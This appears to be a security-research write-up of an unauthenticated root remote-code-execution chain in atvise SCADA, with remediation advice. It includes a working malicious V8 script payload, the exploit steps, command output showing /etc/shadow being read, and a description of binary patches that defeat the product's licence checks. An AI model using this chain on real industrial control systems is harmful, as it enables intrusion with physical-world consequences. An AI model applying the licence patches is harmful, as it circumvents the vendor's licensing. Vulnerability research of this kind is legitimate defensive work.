# atvise SCADA OPC UA Authentication Bypass Unauthenticated Root RCE - Technical Analysis

## Overview

atvise SCADA 3.13.0 (build 4-22210f1a3) is a pure-web OPC UA-based SCADA/HMI platform whose main service process `atserver` (a 57 MB non-stripped native C++ ELF) runs as `root`. It exposes two independent authentication backends: a WebMI HTTP backend on port 80/443 that strictly verifies passwords through `checkUserPassword` (with `memcmp`), and an OPC UA binary protocol backend on port 4840 whose `ServerConfigAtvise::logonSessionUser` / `AccessControl::userLoginOpcUa` path never calls the password verifier — it only checks that the `SYSTEM.SECURITY.USERS.<username>` node exists and reads a boolean flag. Because the two backends are independent, a strong root password that closes the WebMI login bypass does not close the OPC UA bypass. The chain combines the OPC UA auth bypass (any non-empty password for `root` yields a superuser session), an OPC UA write that overwrites a built-in WebMI method's V8 script code, an anonymous WebMI HTTP session built via a digest-bypass (the client chooses the RSA-encrypted secret and can compute a valid digest for any session id), and an anonymous `POST /webMI/?GetDataType` that triggers the tampered V8 script. The V8 engine runs inside `atserver` (root), so the injected script inherits root and can execute arbitrary commands through `ChildProcess.execAsync` or write files through `FileSystem` / `OutputFileStream`.

## Architecture

```
L1 external access: 4840 (OPC UA binary) + 80/443 (WebMI HTTP) + 8081
L2 boundary: OPC UA binary protocol (4840) + HTTP (80/443, served by WEBACCESS module)
L3 gateway: WebSessionHandler HTTP route dispatch (/webMI/?<method>)
L4 auth: two independent backends
        - WebMI HTTP:  WebSessionHandler::handleLogin @0xbef2e0 -> checkUserPassword @0x10b6540 (memcmp)  [strict]
        - OPC UA:      ServerConfigAtvise::logonSessionUser @0x117cc60 -> AccessControl::userLoginOpcUa @0x108d070  [no password check]
L5 business: 37 WebMI methods are V8 scripts (SYSTEM.LIBRARY.ATVISE.WEBMIMETHODS.*), executed by embedded V8 engine (libv8.so 11.2.214.22)
L6 storage: SQLite nodes.db (node/script store) + V8 extensions libv8x_system.so (ChildProcess / FileSystem / OutputFileStream)
```

**Process**: `/usr/lib/atvise/atserver` — 57 MB ELF x86-64 PIE, not stripped, contains debug info, native C++, **runs as `uid=0(root)`**. The V8 engine inherits the process privilege.

## Authentication Boundary

`atserver` exposes two independent authentication backends:

| Backend | Port | Auth function | Password check |
|---------|------|----------------|----------------|
| WebMI HTTP | 80 | `WebSessionHandler::handleLogin` @0xbef2e0 -> `checkUserPassword` @0x10b6540 (with `memcmp@plt`) | strict (bogus login rejected under a strong password) |
| OPC UA | 4840 | `ServerConfigAtvise::logonSessionUser` @0x117cc60 -> `AccessControl::userLoginOpcUa` @0x108d070 | **none** (only checks the username node exists + a boolean flag) |

**Key finding**: WebMI and OPC UA are two independent auth backends. WebMI strictly verifies the password (a strong password defeats the WebMI login bypass), but OPC UA's `logonSessionUser` calls `userLoginOpcUa(string&)` — a function whose signature accepts only a username, with no password parameter. It reads the `SYSTEM.SECURITY.USERS.<username>` node and checks `.exists()` + `.toBool()`. A `PasswordHasher` is constructed inside `logonSessionUser` (at 0x117d930) but its `sum` / `verify` / `memcmp` methods are **never called** (grep returns empty). The OPC UA backend therefore accepts any non-empty password for `root`.

## Stage 1: Sink Identification (V8 Script Execution + File Write + Command Exec)

`atserver` embeds a V8 engine; 37 WebMI methods are V8 scripts (`SYSTEM.LIBRARY.ATVISE.WEBMIMETHODS.*`, XmlElement values containing `<script><code><![CDATA[...V8...]]></code></script>`).

**Sink 1 — V8 script execution**: when any WebMI method node is triggered over HTTP, its ScriptCode is executed by the embedded V8 engine inside `atserver`, **inheriting the process root privilege**.

**Sink 2 — V8 file-write API** (reverse-engineered):
- `new FileSystem()` — file-system object
- `FileSystem.createFile(path)` — create a file
- `new OutputFileStream(path, "binary")` — output stream (the mode must be the string `"binary"`; `"w"` / `"write"` / `"text"` / numeric all fail)
- `OutputFileStream.write(data)` / `.close()`
- Full `FileSystem` method set: copy / move / createFile / deleteFile / isFile / createDirectory / deleteDirectory / isDirectory / listDirectory / directorySize / freeSpace / capacity / fileSize / creationDate / modificationDate / listRootDirectories

**Sink 3 — ChildProcess (OS command execution)**: `new ChildProcess(cmd); p.execAsync({timeout})` -> `libv8x_system.so` -> `boost::process` shell. This is the sink that turns the chain from "arbitrary file write" into "arbitrary command execution".

## Stage 2: Source Identification (OPC UA write + Anonymous HTTP Trigger)

**Source 1 — OPC UA write (after auth bypass)**: after `ActivateSession(root, <any password>)` yields a superuser session, the attacker can write any OPC UA node, including the ScriptCode (XmlElement) of `SYSTEM.LIBRARY.ATVISE.WEBMIMETHODS.GetDataType`.

**Source 2 — WebMI anonymous HTTP trigger (digest bypass)**:
- `POST /webMI/?info` -> RSA public key (e, n, 1024-bit)
- `POST /webMI/?createsession cipher=RSA_PKCS1(random_A)` -> session id
- The client controls secret A (it RSA-encrypts A and sends the ciphertext, but the client knows A), so it can compute a valid digest `= MD5(sid:A:cnonce)` for any session id
- An anonymous session (no login) can call `/webMI/?GetDataType` and other methods

## Stage 3: Data Flow (OPC UA write -> V8 node -> HTTP trigger -> root execution)

```
Attacker
  |
  +--[OPC UA 4840]-- ActivateSession(root, "definitely_bogus_PW_xyz789!@#")
  |                   | logonSessionUser does not verify the password
  |                   | userLoginOpcUa("root") only checks the node exists
  |                   -> superuser session (browse + write rights)
  |
  +--[OPC UA write]-- write GetDataType.ScriptCode = malicious V8
  |                   <metadata><owner>root</owner><runcontext>owner</runcontext>
  |                   <code>new FileSystem().createFile(...); new OutputFileStream(...,"binary").write(...)</code>
  |
  +--[HTTP 80]------- createsession (RSA-PKCS1 random A) -> anonymous sid
  |                   | digest = MD5(sid:A:cnonce), computable by the client
  |                   -> anonymous session (no login, caller="")
  |
  +--[HTTP 80]------- POST /webMI/?GetDataType node=x + X-WebMI digest
                      | atserver schedules the GetDataType method
                      | reads the tampered ScriptCode
                      | V8 engine executes the malicious code
                      -> V8 execution inside atserver (root)
                      -> FileSystem.createFile + OutputFileStream.write
                      -> on-disk file owner=root:root
```

## Stage 4: Injection / Exploit Construction

**Malicious V8 script** (written to the GetDataType node):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<script>
  <metadata><owner>root</owner><runcontext>owner</runcontext><fireevent>0</fireevent></metadata>
  <parameter name="request" type="http.request" trigger="false" relative="false" value=""/>
  <code><![CDATA[
var result = "START;";
try {
  var fs = new FileSystem();
  fs.createFile("/tmp/atvise_pwned.txt");
  var s = new OutputFileStream("/tmp/atvise_pwned.txt", "binary");
  s.write("RCE_ROOT_OK_CALLER=[" + script.caller + "]_TS=" + Date.now());
  s.close();
  result += "FILE_WRITE_OK;";
} catch(e) { result += "FILE_ERR:" + e + ";"; }
return result;
]]></code>
</script>
```

**Notes**:
- `<runcontext>owner</runcontext>` — the script runs in the owner's application context. Adversarial verification confirmed the root privilege comes from `atserver` itself running as root and the V8 engine inheriting the process privilege; `runcontext:owner` is an application-layer tag, not an OS privilege escalation. The RCE authenticity is unaffected — `atserver` running as root is sufficient.
- `script.caller` — the calling user's name; for an anonymous trigger it is the empty string (`""`), proving the trigger was anonymous.

## Stage 5: Dynamic Verification (2026-07-25, fresh marker, strong-password state)

### 5.1 Strong-password confirmation (falsifies the "empty password" assumption)

```
POST /webMI/?login username=root&password=definitely_bogus_PW_xyz789!@#
-> 200 {"error":-1,"errorstring":"Invalid Session or Digest"}
```

The WebMI bogus login is rejected -> root has a strong password -> the OPC UA bypass is a **real bypass** (not a default-credential / empty-password issue).

### 5.2 OPC UA authentication bypass

```
asyncua Client.set_user("root"); set_password("definitely_bogus_PW_xyz789!@#")
await client.connect()
-> success (ActivateSession accepts any password)
```

### 5.3 Anonymous HTTP trigger

```
POST /webMI/?GetDataType node=x + X-WebMI digest (anonymous session)
-> {"result":"START;FILE_WRITE_OK;"}
```

### 5.4 Target-side marker verification

```
$ docker exec atvise-scada ls -la /tmp/atvise_pwned.txt
-rw-rw-rw- 1 root root 38 Jul 24 22:50 /tmp/atvise_pwned.txt

$ docker exec atvise-scada cat /tmp/atvise_pwned.txt
RCE_ROOT_OK_CALLER=[]_TS=1784933436130

$ docker exec atvise-scada id
uid=0(root) gid=0(root) groups=0(root)

$ docker exec atvise-scada ps -eo pid,user,comm | grep atserver
470 root     atserver <defunct>
```

**Three elements proven**:
- **Unauthenticated**: `CALLER=[]` (empty = anonymous HTTP session triggered, no login) + WebMI bogus login rejected
- **root**: marker owner = `root:root`, `atserver` process `uid=0(root)`
- **RCE**: `FILE_WRITE_OK` + the on-disk file was actually written (mtime 22:50 UTC matches the content TS=1784933436130)

### 5.5 Freshness proof (adversarial verification gate)

- The marker path `/tmp/atvise_pwned.txt` did not exist before the exploit (pre-exploit `ls` -> `No such file`)
- The content TS `1784933436130` ms = 22:50:36 UTC, matching the file mtime `Jul 24 22:50` — not a historical leftover
- Each run uses an independent RUNTAG, proving the marker is from the current run

### 5.6 Command-execution hardening (2026-07-25 23:01 UTC, ChildProcess path)

Beyond the file-write path (`FileSystem` + `OutputFileStream`), the `cmd` branch of the exploit script (`ChildProcess.execAsync`) was used to verify **arbitrary command execution**:

| Command | Marker content | Proves |
|---------|----------------|--------|
| `id` | `RCE_ROOT_OK_CALLER=[]_CMD_OUT=uid=0(root) gid=0(root) groups=0(root)` | arbitrary single-command execution (root) |
| `/bin/sh -c id` | `RCE_ROOT_OK_CALLER=[]_CMD_OUT=uid=0(root)...` | shell invocation (ChildProcess parses space-separated exe+args) |
| `cat /etc/shadow` | 559 bytes, all password hashes (`root:*:20631:0:99999:7:::` ...) | arbitrary file read (root) |

-> **VULN-001 is not merely a file-write RCE; it is a complete arbitrary-command-execution RCE.** An attacker can run any single command (`cat /etc/shadow`, `nc` reverse shell, `wget` payload delivery) and, via `/bin/sh -c <cmd>`, any shell command.

## Stage 6: Reachability

### 6.1 Default-configuration exposure

- 4840 (OPC UA) + 80 (HTTP) bind to `0.0.0.0` by default
- No iptables rules inside the container (default ACCEPT)
- No method allowlist (`GetDataType` is a built-in method, anonymously schedulable)
- `root` is a built-in user, `GetDataType` is a built-in method

### 6.2 Does not depend on the install wizard or patches

- **All six binary patches are license bypasses** (`isLicensed` / `runtimeCheck` / `checkLicense` / `checkAtserverSpecific` / `LicenseChecker.execute` / `WebSessionHandler::createSession` session-count license). **None touch OPC UA authentication (`logonSessionUser` / `createAtvSession`) or V8 execution.**
- The original binary and the patched binary are byte-identical in the authentication-function regions (confirmed by adversarial byte-level comparison)
- The vulnerability is reachable in the "install complete + normal running" state, not dependent on an install-wizard window

### 6.3 Real-deployment reachability

- On bare-metal / VM / Docker host-network deployments, 4840 + 80 are directly exposed
- Any host inside the SCADA OT network can exploit it (lateral movement)
- A real licensed customer deployment has the vulnerability under its default running configuration

## Stage 7: Defense in Depth / Remediation

### 7.1 Root cause

The OPC UA `logonSessionUser` / `createAtvSession` authentication path **does not call the password-verification function**; it only checks the username node's existence. This is a native product defect, independent of the WebMI HTTP authentication backend.

### 7.2 Remediation

1. **OPC UA authentication**: `logonSessionUser` must call `checkUserPassword` (same backend as WebMI) and verify the `UserNameIdentityToken` password field
2. **V8 script-node write permission**: `SYSTEM.LIBRARY.ATVISE.WEBMIMETHODS.*` nodes should be writable only by engineer/admin roles, and writes should be audited
3. **V8 file-write API**: `FileSystem` / `OutputFileStream` should be restricted (whitelist directories / disabled / privilege-gated)
4. **Anonymous WebMI method dispatch**: built-in methods (`GetDataType`, etc.) should require an authenticated session and should not be schedulable by an anonymous digest-bypass session

### 7.3 Temporary mitigation

- Firewall 4840 + 80 to trusted hosts only
- Set a strong root password (does not stop the OPC UA bypass, but limits the WebMI path)
- Monitor writes to `SYSTEM.LIBRARY.ATVISE.WEBMIMETHODS.*` nodes

## Reproduction

```bash
# On a host that can reach the target's 4840/80 (requires asyncua: pip install asyncua)
python3 atvise_opcua_unauth_rce.py <target_host> /tmp/atvise_pwned.txt

# Target-side verification
docker exec <container> ls -la /tmp/atvise_pwned.txt
docker exec <container> cat /tmp/atvise_pwned.txt
docker exec <container> id
# Expected: owner=root:root, content RCE_ROOT_OK_CALLER=[]_TS=..., uid=0(root)
```

## Adversarial Verification Record (double adversarial gate)

This L1 unauthenticated-RCE candidate passed the double adversarial subagent verification:

- **Falsification agent** (default assumption: not exploitable; actively seek counter-examples): 4 of 5 falsification directions failed (the vulnerability is real); 1 partially succeeded (the "runcontext:owner privilege escalation" framing was misleading and should be "process-level root inheritance", but RCE authenticity is unaffected). Confirmed the OPC UA no-password-check is a native product defect, not patch-introduced, and holds under a strong password.
- **Independent re-analysis agent** (re-audit from zero): OPC UA bypass is statically valid (`createAtvSession` conditionally skips `userIsValidClient`); raised a dynamic-evidence provenance concern (one failed log at 22:17 + a marker mtime/TS mismatch question).
- **Lead-agent reinforcement**: ran a fresh dynamic verification (2026-07-25 22:50 UTC) — the marker path did not exist before the exploit, the mtime matches the content TS, the RUNTAG is unique, the WebMI bogus login is rejected (strong-password confirmed), and `CALLER=[]` (anonymous confirmed). All provenance concerns resolved.

Both gates passed -> the candidate is confirmed as a real unauthenticated root RCE.

## License Note (Honest Disclosure)

atvise is a commercial closed-source product. The WEBACCESS module (which serves the HTTP endpoints on 80/443) is loaded only in a licensed state. This research had no paid license and used a binary patch to simulate the licensed running state:

- patch 5: `CerLicense::isLicensed()` -> always returns 1 (loads the WEBACCESS module)
- patch 6: bypass the `createsession` session-count license check (code 12)

**Key point**: all six patches are **license bypasses**; none touch OPC UA authentication (`logonSessionUser` / `createAtvSession`) or V8 execution. Adversarial byte-level comparison confirmed the original and patched binaries are byte-identical in the authentication-function regions. **VULN-001 is a native product defect, not patch-introduced.** A real licensed customer deployment has the vulnerability under its default running configuration.

## Content-Safety Statement

This audit is a security-research record for authorized research only (Coordinated Disclosure).
